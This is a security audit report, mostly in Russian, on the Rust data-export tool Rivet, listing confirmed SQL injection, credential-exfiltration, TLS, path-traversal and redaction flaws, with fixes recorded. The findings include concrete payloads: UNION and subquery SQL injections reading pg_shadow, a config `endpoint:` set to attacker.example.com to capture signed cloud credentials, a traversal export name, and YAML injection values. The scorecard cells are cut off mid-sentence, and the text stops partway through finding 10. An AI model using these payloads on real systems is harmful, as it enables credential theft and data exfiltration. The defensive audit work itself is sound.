# Rivet — жёсткий секьюрити-аудит

**Дата:** 2026-06-11 · ветка `feat/ux-clarity` · ~64k LOC Rust

> **Методика.** 10 ред-тим ревьюеров по классам угроз (SQLi, secrets, cloud-SSRF, TLS, path-traversal, subprocess/IPC, deser/input, MCP, deps/build, DoS) прочитали реальный код; каждая находка прошла **адверсариальную exploit-верификацию** — отдельный red-teamer пытался построить рабочий эксплойт в явной модели угроз и искал upstream-guard (quote_ident, bind-параметры, type-constraint, redact, path-reject), подтверждая только при достижимом триггере. **23 уязвимостей подтверждено (17 exploitable), 10 info/положительных, 1 опровергнуто.**

**Модель угроз:** untrusted-config-author (чужой/CI-конфиг), malicious-source-db-data, malicious-mcp-client (prompt-injected LLM), local-attacker, network-mitm, supply-chain.

---

> ## СТАТУС ИСПРАВЛЕНИЙ (2026-06-11) — все 21 закрыты по RED→GREEN
>
> Тем же конвейером: **15 `sec_`-exploit-тестов** написаны ДО фиксов (доказательная матрица «эксплойт срабатывает сегодня»), затем фиксы — каждый позеленил свой тест. Финал: **1630 offline + live (sqli/tls/terminal/source/repair) зелёные, clippy -D warnings + cargo audit чисты.** Один коммит `38804f1` (правки взаимозависимы — общие `require_tls_or_loopback`/`sanitize_terminal`/`quote_ident`; pre-commit hook требует standalone-компиляции каждого коммита).
>
> **HIGH:** V0/V1 preflight SQLi → `quote_ident` (как MSSQL-сосед); V2/V12 → reject non-loopback/http cloud `endpoint:`; V3/V4 → `require_tls_or_loopback` (remote plaintext/trust-cert = loud fail-fast перед connect, loopback OK → docker не задет, 0.06s вместо 75s); V5/V15 → reject traversal/absolute `name`/`path`; V6 → reject NUL в param-значениях (сужено с newline — ломало документированный verbatim-контракт).
> **MEDIUM:** V7/V8 → `rfind('@')` в обоих редакторах (пароль с `@` больше не утекает в plan-JSON/логи); V9 → `sanitize_terminal` C0/C1/DEL на single-export (summary/main) И parallel-renderer путях; V10/V18 → MCP через TLS-aware connect; V13 → loud cert-knob reject.
> **LOW:** V11 redact MCP-ошибок; V14/V16 `safe_join` (reject `..`/absolute/NUL) + `O_EXCL` temp; V17 честная документация unkeyed-checksum; V20 seed за `required-features=["dev-seed"]` + runtime-confirmation; V21 read-cap на manifest.json в трёх ридерах.
> **Ранее отложенное — закрыто (2026-06-11, по решению):** **V19** — bump tiberius невозможен (0.12.3 последняя); выбран **document+WARN** (gate отложен до реального MSSQL-procurement-спроса): audit.toml несёт документированный scoped-suppress (reachability узкая — только verify-ca/verify-full с name-constrained private CA на MSSQL), + one-time runtime WARN на cert-validation-арме `mssql/mod.rs` информирует оператора, включившего строгую валидацию. Чистый `cargo audit` дал бы только feature-gate — отложен как продуктовое решение. **V22** — задокументировано как принятое known-limitation в doc-комментарии `check_value_ceiling`: guard post-materialization (один decode ≤256MB-класса до срабатывания, не unbounded OOM; guard ON by default); настоящий source-side cap лоссёв/недостижим через драйверы. **Seed follow-up** — `[[bin]] seed` за `required-features=["dev-seed"]` (дефолтный `cargo install`/build НЕ тянет seed — проверено: `cargo build --bin seed` падает без фичи); CI (nightly-live.yml) и render.sh обновлены на `--features dev-seed` + `RIVET_SEED_I_KNOW=1` на исполняемых инвокациях.
>
> ИНФО-находки аудита подтвердили хорошую защиту: креды не в argv, IPC-граница надёжна, billion-laughs закрыт, GCS token-mint не SSRF-able, partition-путь из данных БД защищён date-parse.

---

## TL;DR — приоритеты

Ядро SQL-конструирования, IPC-граница, redaction-wiring, partition-путь из данных БД и YAML-парсер — **защищены хорошо** (verified). Реальная экспозиция концентрируется в трёх местах: (1) **preflight-слой** остался с raw-интерполяцией идентификаторов в SQL, хотя prod-пути и MSSQL-сосед уже через `quote_ident`; (2) **config-управляемые «строки доверия»** без валидации — `endpoint:` (эксфил cloud-кредов), `name:`/`path:` (path traversal), `${param}` (инъекция в сырой YAML/SQL); (3) **TLS opt-in, а не opt-out** — PG/MySQL по умолчанию plaintext, MSSQL trust-any-cert. Сквозная тема: **строки из конфига считаются доверенными**, что неверно для shared/CI-конфигов.

## Scorecard по классам угроз

| Класс | Posture (1 фраза) |
|---|---|
| **SQL-инъекции** | The single worst issue is that two strings (src/preflight/postgres.rs:242 and src/preflight/mysql.rs:137) let an untrusted-config author achieve arbitrary single-statement SQL read against the source DB simply by having an operator run `riv |
| **Секреты/redaction** | The single worst issue is that this same bug sits on the plan-artifact path (`redact_for_artifact`), producing a *guaranteed, driver-independent* partial-password write into the on-disk plan JSON that rivet markets as a shareable/committabl |
| **Cloud-креды/SSRF** | A shared or CI config that only sets `endpoint:` + `bucket:` thus turns the operator's ambient cloud identity into a replayable token captured at an attacker host, and it fires on `rivet doctor`'s write-probe before any export — that is the |
| **TLS-транспорт** | The single worst issue is the silent-plaintext-by-default for PG/MySQL source connections, because it requires zero attacker config — just an ordinary operator who never added a `tls:` block — and yields both credential capture and full dat |
| **Path-traversal** | The single worst issue: an untrusted-config-author can set `name: ../../../home/...` and, on a local destination, write fully attacker-controlled export bytes to an arbitrary directory outside the output prefix — an arbitrary-directory writ |
| **Subprocess/IPC** | That terminal-injection finding (medium) is the single worst issue here and is the only change worth making in this module. |
| **Десериализация/ввод** | That textual-substitution-before-parse is the single worst issue and the highest-rated finding |
| **MCP-сервер** | The single worst issue is the unconditional `NoTls` Postgres connection (line 221): an operator who sets `DATABASE_URL=...?sslmode=require` reasonably believes the diagnostic traffic is encrypted, but every MCP query — including credential  |
| **Зависимости/сборка** | The single worst issue is that the MSSQL engine pulls a fully-vulnerable `rustls-webpki 0.101.7` (three 2026 advisories: a reachable CRL panic and two CA name-constraint bypasses) through `tiberius → tokio-rustls 0.24 → rustls 0.21`, and th |
| **DoS/ресурсы** | The single worst issue is the uncapped manifest read. |

---

## Подтверждённые уязвимости

### 🟧 HIGH

#### 1. Postgres preflight min/max range probe interpolates chunk_column/cursor_column raw into SQL (no quote_ident)
`src/preflight/postgres.rs:242` · CWE-89 SQL Injection · attacker: **untrusted-config-author** · **EXPLOITABLE** · ревьюер: sqli

```rust
let range_query = match crate::pipeline::chunked::strip_select_star_from(base_query) {
        Some(tbl) => format!("SELECT min({cursor_col})::text, max({cursor_col})::text FROM {tbl}"),
        None => format!(
            "SELECT min({cursor_col})::text, max({cursor_col})::text FROM ({base_query}) AS _rivet"
        ),
    };
    match client.query(&range_query, &[]) {
```

**Эксплойт.** `chunk_column` / `cursor_column` are accepted as arbitrary strings — `Config::validate_export` (src/config/mod.rs:556-652) validates only mode/size, never the identifier (only the `table:` shortcut is checked by validate_table_shortcut_ident). In non-incremental modes, range_col = chunk_column (src/preflight/postgres.rs:95-98), and line 140-141 calls get_cursor_range_pg(client, base_query, col) which interpolates `col` RAW (no quote_ident) into `SELECT min(col)::text...`. A teammate/CI/shared-template config:
  exports:
    - name: orders
      table: events
      mode: chunked
      chunk_column: "id), max((SELECT string_agg(usename||':'||passwd, ',') FROM pg_shadow))::text, max(id"
      chunk_size: 1000
When the operator runs `rivet check` (or `rivet plan`, which calls diagnose_export), the rendered single-statement query `SELECT min(id), max((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow))::text, max(id)::text FROM events` executes against the source and the exfiltrated value is surfaced in the printed `Cursor range` line of the diagnostic. The injection runs in a single statement (no stacked-statement needed), so it works even under the extended-query protocol. Boolean/time-based variants work even when output is not echoed.

**Воздействие.** Arbitrary SQL read against the source DB with the export user's privileges (data exfil of other tables/catalogs, e.g. pg_shadow/pg_user), triggered just by running `rivet check`/`rivet plan` on an attacker-authored config — beyond the single table the operator intended to export.

**Ремедиация.** Quote the column with crate::sql::quote_ident(SourceType::Postgres, cursor_col) before interpolation, exactly as the MSSQL sibling already does (src/preflight/mssql.rs:137 `let expr = crate::sql::quote_ident(SourceType::Mssql, col);`). Pass the quoted expr into get_cursor_range_pg instead of the raw name.

**Поправка верификатора.** The reporter is correct. I checked for every plausible upstream guard and found none on this path: chunk_column/cursor_column are plain Option<String> with no identifier validation (validate_table_shortcut_ident only constrains the `table:` shortcut value; validate_export only checks mode/size/presence). The incremental Postgres branch IS safe (it routes through incremental_key_expr -> quote_ident), and MSSQL preflight is safe (quote_ident), so an earlier hardening wave clearly missed this one chunked/non-incremental function get_cursor_range_pg — exactly the sibling-gap shape. Minor refinements to the reporter's PoC: (1) cursor_col is interpolated TWICE (min and max), so the rendered statement is doubled but still a single valid statement — I reproduced it with rustc and it parses fine; a cleaner payload is chunk_column: "(SELECT current_setting('...'))" or any subquery that survives being wrapped in min()/max(). (2) The exfiltrated value lands in column index 1 (cursor_max), printed as the right-hand side of `Cursor range: <min> .. <leak>`. Boolean/time-based blind variants work even when the line is not printed.

#### 2. MySQL preflight min/max range probe interpolates chunk_column/cursor_column raw into SQL (no quote_ident)
`src/preflight/mysql.rs:137` · CWE-89 SQL Injection · attacker: **untrusted-config-author** · **EXPLOITABLE** · ревьюер: sqli

```rust
} else if let Some(col) = range_col {
        let range_query = format!(
            "SELECT CAST(min({col}) AS CHAR), CAST(max({col}) AS CHAR) FROM ({base}) AS _rivet",
            col = col,
            base = base_query,
        );
        match conn.query_first::<(Option<String>, Option<String>), _>(&range_query) {
```

**Эксплойт.** Same root cause and same threat actor as the Postgres finding: range_col = chunk_column.or(cursor_column) (src/preflight/mysql.rs:92-95) is never identifier-validated by config validation. The incremental branch (line 122-124) correctly uses the quoted `expr` from incremental_key_expr, but the chunked/range branch (line 135-137) interpolates `col` RAW. Config:
  mode: chunked
  chunk_column: "id) AS a FROM events UNION SELECT @@version, CAST(current_user() AS CHAR) -- "
Running `rivet check` renders `SELECT CAST(min(id) AS a FROM events UNION SELECT @@version, CAST(current_user() AS CHAR) -- ) AS CHAR), ... FROM (SELECT * FROM events) AS _rivet` and executes it via conn.query_first (text protocol). The attacker controls the FROM/UNION and can exfiltrate arbitrary data into the printed `Cursor range` line, or use boolean/time-based extraction when output is suppressed.

**Воздействие.** Arbitrary SQL read (UNION-based exfil, version/user disclosure, cross-table reads) against the MySQL source with the export user's privileges, triggered by `rivet check`/`rivet plan` on a hostile config.

**Ремедиация.** Wrap with crate::sql::quote_ident(SourceType::Mysql, col) before building range_query, matching the already-fixed MSSQL path (src/preflight/mssql.rs:137). Apply the same to the EXPLAIN/effective_query ORDER BY only if it ever uses a raw column (the ORDER BY uses the quoted incremental_key_expr today, so only the range branch needs the fix).

**Поправка верификатора.** No upstream guard exists. Config validation (src/config/mod.rs ExportMode::Chunked arm) only enforces presence of a chunking strategy and chunk_size/parallel >= 1 — it never validates the column name as an identifier (no charset check, no quote_ident, no deny). The fix the codebase already applies everywhere else — crate::sql::quote_ident — is simply absent on this one branch (and on the Postgres get_cursor_range_pg twin). The correct remediation is to quote the column via incremental_key_expr-style quoting / quote_ident(SourceType::Mysql, col) before interpolation, matching detect.rs and aggregate_sql.

#### 3. Config-controlled `endpoint:` exfiltrates ambient cloud credentials (S3 SigV4 / GCS bearer token / Azure key) to an attacker host — no scheme or host validation
`src/destination/s3.rs:43` · CWE-918 Server-Side Request Forgery (and CWE-522 Insufficiently Protected Credentials) · attacker: **untrusted-config-author** · **EXPLOITABLE** · ревьюер: cloud-ssrf

```rust
if let Some(endpoint) = &config.endpoint {
    builder = builder.endpoint(endpoint);
}

if let Some(env_name) = &config.access_key_env {
    let key = read_credential_env(env_name, "access key")?;
    builder = builder.access_key_id(key.as_str());
}
```

**Эксплойт.** Operator runs a shared/CI/teammate-authored rivet config on a host with ambient AWS creds (an EC2/EKS instance IAM role, or `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY` in env). The hostile config sets only:
```
destination:
  type: s3
  bucket: anything
  endpoint: https://attacker.example.com
```
No `access_key_env`/`secret_key_env` are set, so opendal S3 (backend.rs:777-782 `from_profile().from_env()`, and backend.rs:864-868 `AwsDefaultLoader` WITHOUT `disable_ec2_metadata` — rivet never calls it for S3) loads the operator's ambient credentials, including pulling the EC2 instance-role STS credentials from IMDS. opendal then SigV4-signs each request to `config.endpoint` (build_endpoint at backend.rs:499-507 keeps the user endpoint verbatim) and sends them to attacker.example.com. The attacker server captures the `Authorization: AWS4-HMAC-SHA256 Credential=AKIA…/…, Signature=…` header plus `x-amz-security-token` (the full STS session token in cleartext for token-based creds), and the access key id. With the captured session token + signed requests the attacker can read/write the victim's real S3. This triggers on the cheapest command: `rivet doctor` (preflight/doctor.rs:154-158 `create_destination_for_probe` then `d.write(...)`) performs a live signed PUT to the endpoint, so the exfil fires before any export. The same primitive exists in gcs.rs:29-31 (the config endpoint receives the OAuth bearer access token in `Authorization: Bearer ya29.…`, because when no explicit creds are set gcs.rs:52-56 falls through to opendal's default chain incl. VM metadata) and azure.rs:186-189 (the config endpoint receives the account key / SAS signature).

**Воздействие.** Credential exfiltration: an untrusted config author who can set `endpoint:` (and supply no explicit keys, inheriting the operator's ambient IAM role / env keys / ADC / Azure key) captures live, replayable signed cloud requests and the underlying STS session token / OAuth bearer token / Azure SAS signature at an attacker-controlled host. Effective compromise of the operator's cloud identity for the lifetime of the token.

**Ремедиация.** Validate `endpoint` at config-load time (src/config/mod.rs destination validation): (1) require `https://` scheme unless `allow_anonymous` is set or the host is loopback (emulator), rejecting `http://` to non-local hosts; (2) for S3/GCS/Azure, when a custom `endpoint` is combined with the *default/ambient* credential chain (no explicit `*_env` creds for the matching backend), either refuse or require an explicit `allow_custom_endpoint_with_ambient_creds: true` opt-in — ambient IAM-role / env-key / ADC credentials must never be auto-signed toward an arbitrary host named only by config. For S3 specifically, call `.disable_ec2_metadata()` and `.disable_config_load()` whenever a non-default endpoint is set, so IMDS instance-role creds are never harvested for a third-party endpoint.

**Поправка верификатора.** The reporter cited line numbers in a "backend.rs" (777-782, 864-868, 499-507) that does not exist in the rivet source — those are opendal's internal files, not rivet code, so the specific call-site claims (from_profile().from_env(), AwsDefaultLoader without disable_ec2_metadata, build_endpoint) cannot be verified in this repo and were copied without opening a rivet file. The real rivet sinks are s3.rs:43, gcs.rs:29, azure.rs:186; the absence of disable_ec2_metadata is confirmed by its absence from s3.rs (not by a backend.rs line). The exploit is also conditional, not unconditional: it only exfiltrates live credentials when the operator's host actually carries ambient creds (IMDS instance role / AWS_* env / ADC / GCE metadata) AND the config does not pin explicit keys — if the shared config sets access_key_env, those env-named creds are still signed to the attacker endpoint, so the SSRF/exfil holds, but a host with no ambient identity and explicit keys absent simply fails the probe with no credential leak.

#### 4. Source DB defaults to PLAINTEXT (NoTls) for Postgres and MySQL when no `tls:` block is configured — credentials + all exported rows cross the wire in cleartext
`src/source/mod.rs:289` · CWE-319 Cleartext Transmission of Sensitive Information · attacker: **network-mitm** · **EXPLOITABLE** · ревьюер: tls

```rust
pub(crate) fn warn_if_tls_disabled(config: &SourceConfig) {
    let enforced = config.tls.as_ref().is_some_and(|t| t.mode.is_enforced());
    if !enforced {
        static WARNED: std::sync::Once = std::sync::Once::new();
        WARNED.call_once(|| {
            log::warn!(
                "source: TLS is not enforced — credentials and result rows cross the network in plaintext.
```

**Эксплойт.** An operator runs a perfectly ordinary config with no `tls:` block:
```yaml
source:
  type: postgres
  url_env: DATABASE_URL
exports: [...]
```
`create_source` → `PostgresSource::connect_with_tls(url, None)` → the `_ =>` arm → `Self::connect(url)` → `Client::connect(url, NoTls)` (src/source/postgres/mod.rs:73). MySQL is identical (`connect_with_tls` `_ =>` arm → `Self::connect` → `Pool::new` with no ssl_opts, src/source/mysql/mod.rs:127). The handshake is plaintext: an on-path attacker (cross-AZ, inter-VPC, compromised switch, malicious egress proxy) reads the libpq/MySQL startup packet carrying the username + cleartext-or-MD5/SHA password and then every exported row. The only mitigation is a one-time `log::warn!` that does not stop or fail the export; `rivet doctor` likewise only warns (doctor.rs:124) and exits green. Default-deny is inverted: security requires the operator to *add* config, and most will never see a warn at default log level on a CI run.

**Воздействие.** Full credential capture (DB user + password) and exfiltration of every exported row to a passive on-path attacker. Worst case: source-DB takeover via the captured credentials plus total data disclosure.

**Ремедиация.** Make TLS the default: when `config.tls` is `None`, derive `TlsMode::VerifyFull` (system trust store) rather than `NoTls`, and require an explicit `tls: { mode: disable }` to opt into plaintext. At minimum, gate plaintext behind an explicit opt-in and make `doctor` FAIL (non-zero) rather than warn when a non-loopback host is reached without TLS.

**Поправка верификатора.** The reporter slightly overstated two points but the core vuln stands. (1) The warning is visible by default: src/main.rs:46 sets `default_filter_or(\"warn\")`, so the one-time log::warn fires on a normal/CI run — it just is not fatal. (2) The path is not uniformly silent: a Postgres URL carrying `?sslmode=require` makes the EXPORT path fail-closed (tokio-postgres connect_tls calls NoTls::connect → NoTlsFuture resolves to Err(NoTlsError), so the connection errors rather than downgrading). The genuine missed sibling gap is the inconsistency the reporter did not name: src/init/postgres.rs (tls_mode_from_url) and src/state/mod.rs (state_tls_mode_from_url) BOTH derive TLS from the URL's sslmode, but the actual data-export connect (connect_with_tls) only consults config.tls and never inspects the URL — so `?sslmode=require` in DATABASE_URL secures init and the state backend yet hard-fails (or, for prefer/disable/absent, silently runs plaintext) on the export itself. Fix: make connect_with_tls fall back to tls_mode_from_url(url) like init/state already do, and/or have create_source refuse to connect plaintext to a non-local host unless tls.mode is explicitly Disable (true default-deny). MySQL has no URL escape hatch at all, so it must be config-driven.

#### 5. MSSQL defaults to trust-any-server-certificate (`trust_cert()`) when no `tls:` block is set — encrypted but unauthenticated, so a MITM cert is silently accepted
`src/source/mssql/mod.rs:160` · CWE-295 Improper Certificate Validation · attacker: **network-mitm** · **EXPLOITABLE** · ревьюер: tls

```rust
None => {
                // No `tls:` block at all ⇒ tiberius trusts the server certificate
                // without verifying issuer or hostname...
                static WARNED: std::sync::Once = std::sync::Once::new();
                WARNED.call_once(|| {
                    log::warn!(...);
                });
                config.trust_cert();
            }
```

**Эксплойт.** Operator config with `type: mssql` and no `tls:` block (the common case). `connect_with_tls(url, None)` hits the `None =>` arm and calls `config.trust_cert()` on the tiberius `Config` while `EncryptionLevel::Required` is set. tiberius then completes a TLS handshake but performs NO chain or hostname validation. A network MITM (ARP spoof, rogue DNS, compromised gateway) presents any self-signed cert for `host`; rivet accepts it, the attacker terminates TLS, captures the SQL Server login (username + password) and proxies to the real server, reading all exported rows. Encryption gives a false sense of safety because the cert is never checked. Only a one-time warn fires; nothing fails. The operator must *know* to add `tls: { mode: verify-full, ca_file: ... }` to get authentication — the secure path is opt-in, not default.

**Воздействие.** Active MITM credential theft and full data interception against any MSSQL export run without an explicit `tls:` block.

**Ремедиация.** Default the no-`tls:` MSSQL path to full validation (omit `trust_cert()` so tiberius validates against the system trust store) and require an explicit `accept_invalid_certs: true` (or `mode` that maps to it) to downgrade. Self-signed dev should be the opt-in, not the default.

**Поправка верификатора.** No upstream guard mitigates this. I traced the alternatives: tiberius' own default (TrustConfig::Default) calls with_native_roots() and would give full chain+hostname verification for free — but rivet's None arm deliberately overrides it with config.trust_cert() (TrustConfig::TrustAll), which installs NoCertVerifier (verify_server_cert returns Ok unconditionally, ignoring chain, issuer, and hostname). The only mitigation is a one-time log::warn!, which neither fails the run nor blocks the handshake. Two minor clarifications that do NOT shrink the hole: (a) when a tls: block IS present without ca_file (modes require/verify-ca/verify-full), MSSQL calls neither trust_cert nor trust_cert_ca, leaving TrustConfig::Default = full verification — safe, though MSSQL ignores cfg.mode/accept_invalid_hostnames entirely (a separate divergence from the shared build_native_tls). (b) The hole is solely the None (no tls: block) arm, which is the documented default and the path init/doctor/check/run all use.

#### 6. Unvalidated export.name escapes the local destination directory (arbitrary-directory file write)
`src/pipeline/single.rs:345` · CWE-22 Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) · attacker: **untrusted-config-author** · **EXPLOITABLE** · ревьюер: path-traversal

```rust
let file_name = if has_parts {
    format!("{}_{}_part{}.{}", plan.export_name, ts, part_idx, ext)
} else {
    format!("{}_{}.{}", plan.export_name, ts, ext)
};
```

**Эксплойт.** The operator runs a shared/teammate-authored rivet.yaml whose export is `name: ../../../../home/victim/.config/autostart/x` with `destination: { type: local, path: ./out }`. `build_plan` copies the name verbatim into `plan.export_name` (src/plan/build.rs:103 `export_name: export.name.clone()`). At commit, `file_name` becomes `../../../../home/victim/.config/autostart/x_20260611_120000.parquet`. It reaches `commit::write_part_file` (src/pipeline/single.rs:353) → `dest.write(tmp, &file_name)` → `LocalDestination::write` which does `Path::new(&self.base_path).join(remote_key)` (src/destination/local.rs:23) with NO `..`/absolute containment, and `create_dir_all(parent)` (local.rs:24-25) happily creates the escaped parent dirs. Result: rivet writes attacker-controlled export bytes (the parquet/CSV payload, fully content-controlled via the `query:`) to an arbitrary directory outside `./out`. `export.name` is never validated for traversal — `Config::validate_export` (src/config/mod.rs:389) guards only `query_file` for `..`/absolute, never `name` or `destination.path`. Partitioned children keep the prefix too: `make_child` does `format!("{}__{}", parent.name, name_value)` (src/pipeline/partition_expand.rs:178).

**Воздействие.** Arbitrary-directory file write on the host running the export: drop files into ~/.ssh, ~/.config/autostart, /etc/cron.d-adjacent operator-writable dirs, a web root, or a CI workspace — escalating to code execution or persistence. The `_<timestamp>.<ext>` suffix prevents overwriting one exact pre-existing file but does not prevent dropping a new file with attacker-controlled content into any writable directory.

**Ремедиация.** Validate `export.name` at config-load time to a filename-safe charset (reject `/`, `\`, `..`, absolute, NUL, leading dot) — mirror the existing `query_file` guard. Independently, harden `LocalDestination::write` to contain the join: reject `remote_key` containing `..` components or being absolute, and after `base_path.join(remote_key)` canonicalize the parent and assert it `starts_with` the canonicalized base before any `create_dir_all`/`copy`.

#### 7. Param/env substitution is textual interpolation into raw YAML+SQL before parse — SQL injection and YAML-structure injection
`src/config/resolve.rs:44` · CWE-89 SQL Injection / CWE-94 Code Injection · attacker: **untrusted-config-author** · **EXPLOITABLE** · ревьюер: deser-input

```rust
result = format!("{}{}{}", &result[..start], value, &result[end + 1..]);
        search_from = start + value.len();
```

**Эксплойт.** `resolve_vars` is called on the RAW config text (src/config/mod.rs:70 `let resolved = resolve_vars(&contents, params)?;`) and again on raw query/query_file text (src/config/export.rs:295,336) BEFORE any YAML/SQL parsing, doing a plain string splice with no escaping. The documented pattern (docs/reference/config.md:511) is `query: "SELECT * FROM orders WHERE region = '${region}'"`. Whoever supplies the param value (`--param region=...`, e.g. a CI variable, a branch name, or an env var referenced by `${region}`) is normally treated as data, but it is interpolated as code. (1) SQL injection — verified live: param `region = x' OR '1'='1' UNION SELECT passwd FROM pg_shadow -- ` produces resolved query `SELECT * FROM orders WHERE region = 'x' OR '1'='1' UNION SELECT passwd FROM pg_shadow -- '`, which is sent verbatim to the DB via `batch_execute(&format!("DECLARE _rivet NO SCROLL CURSOR FOR {built_sql}"))` (src/source/postgres/mod.rs:408) with NO bind parameters. (2) YAML-structure injection — when a `${VAR}` sits in an unquoted scalar (e.g. `query: ${SQL}`, exactly the form in the crate's own tests `resolve_vars("SELECT * FROM ${TABLE}")`), a value containing `\n  - name: exfil\n    table: pg_authid\n    destination: {type: stdout}` injects a whole extra export entry that parses cleanly (verified: the injected sibling export materialised in the parsed `exports` sequence). `deny_unknown_fields` does not help — injected items are valid `ExportConfig`s. Both confirmed by reproducing the exact splice logic against serde_yaml_ng 0.10.

**Воздействие.** Adversarial param/env data exfiltrates arbitrary tables (UNION-based read of pg_shadow/pg_authid etc.) or, via newline-bearing values in an unquoted scalar, smuggles an entirely new export (new table + new attacker destination such as stdout/anonymous bucket) into a config the operator believes is fixed — data tamper and data exfil. A config author can also read arbitrary process env vars (`query: "SELECT '${AWS_SECRET_ACCESS_KEY}'"`) into exported data.

**Ремедиация.** Stop substituting params into raw config/query text. Two layers: (a) for SQL, bind param values as real query parameters ($1/?) rather than string-splicing, or at minimum reject any param value containing a single-quote / SQL metacharacter when it lands in a literal; (b) for YAML, resolve `${VAR}` only AFTER parsing into typed values (substitute into the parsed scalar nodes), never into the raw document, and reject param/env values containing newline / `"` / `'` / `{` / `}`. If textual substitution must stay, validate every param value against a strict allowlist (e.g. `[A-Za-z0-9_.-]+`) and document that param values are NOT safe to populate from untrusted input.

**Поправка верификатора.** The finding's "untrusted-config-author places the payload" framing is the wrong attacker — a config author already writes raw `query:` SQL and gains nothing from `${var}` interpolation, so as a self-attack it would be info/not-a-vuln. The real, realistic vulnerability is the trust SPLIT the docs invite: `--param` is documented as a "Query parameter" substituted as a *value* into `WHERE region = '${region}'`, so the config author treats `${region}` as a safe data slot while the value originates from a lower-trust supplier (CI variable, branch name, upstream system, ambient env). That data-supplier — not the config author — escalates to code. One nuance the report overstated: the DOCUMENTED quoted form (`query: "...'${region}'"`) is NOT vulnerable to YAML-structure injection (I confirmed the newline stays inside the quoted scalar and folds into the string → exports.len()==1); the sibling-export YAML injection only works on an UNQUOTED scalar (`query: ${SQL}`). However the quoted form remains fully open to in-query SQLi (UNION exfil), so the high rating stands regardless.


### 🟨 MEDIUM

#### 8. Plan artifact leaks partial password when the source URL password contains '@' (first-@ split in find_userinfo)
`src/config/source.rs:374` · CWE-532 Insertion of Sensitive Information into Log/Artifact · attacker: **local-attacker** · **EXPLOITABLE** · ревьюер: secrets

```rust
fn find_userinfo(raw: &str) -> Option<(usize, usize)> {
    let scheme = raw.find("://")? + 3;
    let rest = &raw[scheme..];
    let at = rest.find('@')?;
    ...
    Some((scheme + at, scheme))
}
```

**Эксплойт.** Operator config uses an inline URL with an '@' in the password (a routine special-char password), e.g. `source: { type: postgres, url: 'postgresql://rivet:p@ssw0rd@db.example.com/prod' }`. Run `rivet plan --output plan.json` (or `rivet plan` to stdout). `PlanArtifact::new` calls `resolved_plan.source.redact_for_artifact()` (src/config/source.rs:149), which calls `find_userinfo`. `rest.find('@')` returns the FIRST '@' (the one inside the password), so the rewrite becomes `postgresql://REDACTED@ssw0rd@db.example.com/prod` — the password tail `ssw0rd` is written verbatim. plan_cmd.rs:405 writes this to disk and plan_cmd.rs:391 prints it to stdout. Verified empirically: input `postgresql://rivet:p@ssw0rd@db.example.com/prod` → output `postgresql://REDACTED@ssw0rd@db.example.com/prod`. The plan file is an explicitly shareable/committable artifact (ADR-0005 'Artifact Is the Communication Channel'), so the partial credential is exposed to anyone who reads the plan file, a committed repo, or CI logs.

**Воздействие.** Partial/near-complete source-DB password exfiltration via the on-disk plan artifact that ADR-0005 PA9 promises is credential-free; the leaked suffix is frequently most of the password (e.g. `s3c@ret` leaks `ret`, `p@ssw0rd` leaks `ssw0rd`).

**Ремедиация.** Match the algorithm already used by redact_pg_url (src/state/mod.rs:564): locate the authority terminator with `rest.rfind('@')` (last '@' before the first '/'/'?'/'#'), not the first. Add a regression test asserting `postgresql://u:p@ss@host/db` redacts with no substring of the password remaining.

#### 9. Central log/error/summary redactor (redact_url_passwords) leaks password tail after an embedded '@'
`src/redact.rs:117` · CWE-532 Insertion of Sensitive Information into Log/Artifact · attacker: **local-attacker** · **EXPLOITABLE** · ревьюер: secrets

```rust
let mut k = userinfo_start;
    let mut has_colon = false;
    while k < bytes.len() {
        let b = bytes[k];
        if b == b'@' {
            break;
        }
        ...
        if b == b':' {
            has_colon = true;
        }
        k += 1;
    }
```

**Эксплойт.** redact_url_passwords is THE chokepoint for every log line (wired in main.rs:48 env_logger formatter), every persisted `error_message` (job.rs:190/364 via redact_error), summary.json/metrics/journal, and the Slack payload. The userinfo walk breaks at the FIRST '@' (line 119), so for a URL whose password contains '@' it redacts only up to that '@'. With a source URL `mysql://root:s3c@retP@ss@10.0.0.5/billing`, any error/log line containing that URL is redacted to `mysql://REDACTED@retP@ss@10.0.0.5/billing`, leaking `retP@ss`. Verified empirically. Trigger: an operator/teammate config with an '@'-bearing inline URL plus any failure that surfaces the URL string into a log or summary.error_message; the partial password then persists in .rivet/runs/<id>/summary.json/.md and the SQLite metrics/journal, and is posted to the configured Slack webhook.

**Воздействие.** Partial source-DB credential leaked into persisted run artifacts (summary.json/md, metrics DB, journal) and outbound Slack notifications whenever the URL string reaches the redactor.

**Ремедиация.** Use last-'@'-in-authority semantics (mirror redact_pg_url's rfind('@')) when rewriting the userinfo segment, and extend the redact.rs tests to cover `scheme://user:p@ss@host/db` asserting no password fragment survives.

**Поправка верификатора.** The reporter focused on redact.rs (the log/error string-scan path) but the more deterministic, no-error-needed leak is the SIBLING redactor `find_userinfo` (src/config/source.rs:374), invoked by `SourceConfig::redact_for_artifact` (source.rs:149) at `PlanArtifact::new` (plan/artifact.rs:142). `rivet plan` then persists the plan json (plan_cmd.rs:391/405) containing `scheme://REDACTED@<password-tail>@host`. I verified empirically that this URL form is fully reachable: the `url` crate (2.5.8) and `mysql` crate (28) both parse `mysql://root:s3c@retP@ss@host/db` with last-`@` semantics (password = `s3c@retP@ss`, host = correct), so a `@`-bearing inline password connects fine, making the leak realistic rather than theoretical. Two caveats lower the severity below high: (1) it is a PARTIAL leak (only the tail after the first '@'), and (2) it requires the discouraged inline-`url:` plaintext config with a `@` in the password — the recommended `url_env`/`password_env` paths keep only env-var NAMES and are unaffected. For the redact.rs string-scan path specifically, the mysql/postgres driver connect errors do NOT echo the DSN (verified: error is `DriverError { Could not connect: connection timeout }`, no 's3c'), so that sink only fires via mssql parse errors (mssql/mod.rs:102/107) or third-party library messages.

#### 10. Attacker-controlled DB error text re-emitted to operator terminal without control-character sanitization (terminal/log injection across the IPC trust boundary)
`src/pipeline/parent_ui.rs:392` · CWE-150 Improper Neutralization of Escape/Control Sequences · attacker: **malicious-source-db-data** · **EXPLOITABLE** · ревьюер: subprocess-ipc

```rust
let mut handle = std::io::stderr().lock();
        let _ = handle.write_all(out.as_bytes());
        let _ = handle.flush();
```

